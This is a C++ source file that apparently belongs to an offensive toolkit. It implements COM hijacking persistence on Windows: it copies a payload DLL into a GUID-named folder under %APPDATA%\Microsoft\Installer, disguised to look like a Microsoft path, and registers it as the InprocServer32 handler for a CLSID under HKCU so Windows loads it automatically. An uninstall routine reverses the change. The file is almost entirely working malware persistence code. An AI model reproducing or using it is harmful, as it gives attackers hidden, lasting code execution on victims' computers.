#include "com_hijack.h"

bool StartupCom::install()
{
	HKEY hKey;
	DWORD dwDisposition;
	char folder_path[MAX_PATH] = { 0 };
	char folder_path2[MAX_PATH] = { 0 };
	string payload_path;
	char threading_model[] = "Apartment";
	ExpandEnvironmentStringsA("%APPDATA%\\Microsoft\\Installer\\{BCDE0395-E52F-467C-8E3D-C4579291692E}", folder_path, MAX_PATH);
	ExpandEnvironmentStringsA("%APPDATA%\\Microsoft\\Installer", folder_path2, MAX_PATH);
	payload_path = folder_path + string("\\") + m_target_file;
	if (!CreateDirectoryA(folder_path2, NULL))
	{
		printf("[*] create dir:%s error with code:%d!", folder_path, GetLastError());
		return false;
	}
	if (!CreateDirectoryA(folder_path, NULL))
	{
		printf("[*] create dir:%s error with code:%d!", folder_path, GetLastError());
		return false;
	}
	CopyFileA(m_target_file.c_str(), payload_path.c_str(), NULL);
	cout << "payload_path:" << payload_path << endl;
	if (ERROR_SUCCESS != RegCreateKeyExA(HKEY_CURRENT_USER,
		"Software\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\\InprocServer32", 0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition))
	{
		printf("RegCreateKey error£¡");
		return false;
	}
	if (ERROR_SUCCESS != RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)payload_path.c_str(), (1 + payload_path.length())))
	{
		printf("set DLL error£¡");
		return false;
	}
	if (ERROR_SUCCESS != RegSetValueExA(hKey, "ThreadingModel", 0, REG_SZ, (BYTE*)threading_model, (1 + ::lstrlenA(threading_model))))
	{
		printf("set ThreadingModel error£¡");
		return false;
	}
	printf("com hijacking install success!\r\n");

	return true;
}

bool StartupCom::uninstall()
{
	HKEY hKey;
	DWORD dwDisposition;
	char folder_path[MAX_PATH] = { 0 };
	string payload_path;
	char threading_model[] = "Apartment";
	ExpandEnvironmentStringsA("%APPDATA%\\Microsoft\\Installer\\{BCDE0395-E52F-467C-8E3D-C4579291692E}", folder_path, MAX_PATH);
	payload_path = folder_path + string("\\") + m_target_file;
	if (ERROR_SUCCESS != RegCreateKeyExA(HKEY_CURRENT_USER,
		"Software\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\\InprocServer32", 0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition))
	{
		printf("[!] RegCreateKey error£¡");
		return false;
	}
	if (ERROR_SUCCESS != RegDeleteValueA(hKey, NULL))
	{
		printf("[!] Remove DLL error£¡");
		return false;
	}
	if (ERROR_SUCCESS != RegDeleteValueA(hKey, "ThreadingModel"))
	{
		printf("[!] Remove ThreadingModel error£¡");
		return false;
	}
	remove(payload_path.c_str());
	remove(folder_path);
	printf("[*] com hijacking uninstall success!\r\n");
}
